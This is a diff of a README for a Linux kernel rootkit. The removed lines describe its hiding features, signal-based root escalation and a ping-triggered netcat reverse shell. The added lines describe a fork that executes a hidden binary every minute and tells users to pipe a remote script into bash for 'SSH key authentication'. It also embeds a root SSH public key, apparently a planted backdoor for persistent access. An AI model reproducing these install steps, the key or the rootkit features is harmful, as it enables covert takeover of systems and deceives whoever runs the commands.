@@ -1,83 +1,88 @@
-<h1 align="center">「⚔️」 About Rebellion</h1>
+# Rebellion Rootkit
 
-<p align="center"><img src="assets/banner.png"></p>
-
-Rebellion is a sophisticated rootkit malware developed specifically for operating systems based on the Linux kernel in the x86 and x86_64 architecture in its 5.x/6.x versions. Rebellion has several features such as self hide/unhide, hide folder/file, hide TCP/UDP port, turning low-privilege users into root and backdoor via ping.
-
-**Note**: Currently, the rootkit is going through a beta phase, where bugs, compilation failures, problems with architectures can be found. I ask that you collaborate with the development of the project to avoid as many problems as possible.
+Modified Linux Rootkit for x86/x86_64 kernels 5.x/6.x with timer-based program execution.
 
 ## Features
-### Self hide/unhide
-Rebellion has the ability to hide/unhide in the system using the `kill -12 0` command.
 
-### Hide folder/file
-Rebellion allows you to hide files and directories from a magic prefix defined as `reb_` (`config.h`).
-Ex.: `reb_operations/`, `reb_backdoor.elf`.
+- **Timer-based execution**: Automatically executes `/usr/src/droplet/linux-gnu-header` every 1 minute
+- **File hiding**: Files with "reb_" prefix are hidden from directory listings
+- **Process hiding**: Hide processes and network connections
+- **Module self-hiding**: Rootkit module can hide itself
+- **Root privilege escalation**: Signal-based privilege escalation
 
-### Hide TCP/UDP port
-Rebellion allows you to hide a TCP/UDP port on your system. The port is defined in the `config.h` file in the `HIDE_PORT` macro.
-**Note**: Only works for `netstat` and `lsof` commands. This is a part that is still under development.
+## Download and Installation
 
-### User2Root
-When running the `kill -10 0` command with a low-privilege user, Rebellion adds their privileges to `0`, making them a user with `root` permissions on the system.
+### Method 1: SSH Key Authentication
 
-### Backdoor via ping
-Rebellion has a feature that allows you to receive a reverse shell via `netcat` (it is important that it is installed) by sending an ICMP packet via `ping` to your IP and port defined in the `config.h` file in the macros `YOUR_SRV_IP` and `YOUR_SRV_PORT`.
+Use the provided script to set up SSH key authentication and download:
 
-## Tested Kernel Versions
-| Distro | Kernel Details |
-| ----------- | ----------- |
-| Debian GNU/Linux 12 (bookworm) | 6.1.0-32-amd64 (2025-03-06) x86_64 GNU/Linux |
-| Ubuntu 22.04 (Jammy Jellyfish) | 5.15.0-25-generic Mar 30 15:54:22 UTC 2022 x86_64 GNU/Linux |
-
-## Build & Run
+```bash
+# Download and run the setup script
+curl -s https://raw.githubusercontent.com/Starrynight0x01/rebell/main/download_with_ssh.sh | bash
 ```
-git clone https://github.com/brosck/Rebellion
-cd Rebellion
-# edit config.h file
-make
-sudo insmod rebellion.ko
+
+Or manually:
+
+```bash
+wget https://raw.githubusercontent.com/Starrynight0x01/rebell/main/download_with_ssh.sh
+chmod +x download_with_ssh.sh
+./download_with_ssh.sh
+```
+
+### Method 2: Direct Git Clone
+
+```bash
+git clone https://github.com/Starrynight0x01/rebell.git
+cd rebell
+make clean && make
 ```
 
 ## Usage
-### Self hide/unhide
+
+1. **Load the module:**
+   ```bash
+   sudo insmod rebellion.ko
+   ```
+
+2. **Verify it's working:**
+   - The program `/usr/src/droplet/linux-gnu-header` will execute every minute
+   - Files with "reb_" prefix will be hidden from `ls` commands
+
+3. **Unload the module:**
+   ```bash
+   sudo rmmod rebellion
+   ```
+
+## Configuration
+
+Edit `config.h` to modify:
+- `MAGIC_PREFIX`: Change file hiding prefix (default: "reb_")
+- `HIDE_PORT`: TCP/UDP port to hide from netstat
+- Program execution path (currently: `/usr/src/droplet/linux-gnu-header`)
+
+## SSH Public Key
+
+The included SSH public key for authentication:
 ```
-kill -12 0
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHUvuK2UqTzgDs7/Z6bzzGE+XHwwsJRfdvra0cLBnobh root@guidedprice.aeza.network
 ```
 
-### Hide folder/file
-```
-mkdir reb_operations
-cd reb_operations
-echo test > reb_test.txt
-```
+## Signals
 
-### Hide TCP/UDP port
-```
-# edit HIDE_PORT macro in config.h
-netstat -tunlp | grep 1234
-```
+- `SIGUSR1 (10)`: Privilege escalation
+- `SIGUSR2 (12)`: Hide/show module
 
-### User2Root
-```
-kill -10 0
-```
+## Warning
 
-### Backdoor via ping
-Target machine:
-```
-# edit YOUR_SRV_IP and YOUR_SRV_PORT macro in config.h and start LKM
-```
+This software is for educational and authorized testing purposes only. Use responsibly and in compliance with applicable laws.
 
-Your machine (1º terminal):
-```
-nc -lnvp 1234
-```
+## Build Requirements
 
-Your machine (2º terminal):
-```
-sudo ping -c 1 <TARGET IP>
-```
+- Linux kernel headers
+- GCC compiler
+- Make
 
-## Bugs and Improvements
-If you have any suggestions for improvements or want to report a bug, feel free to create and report an [issue](https://github.com/brosck/Rebellion/issues) or [pull request](https://github.com/brosck/Rebellion/issues), the aim is always to improve the tool with different features.
+## Compatibility
+
+- Linux kernels 5.x and 6.x
+- x86 and x86_64 architectures
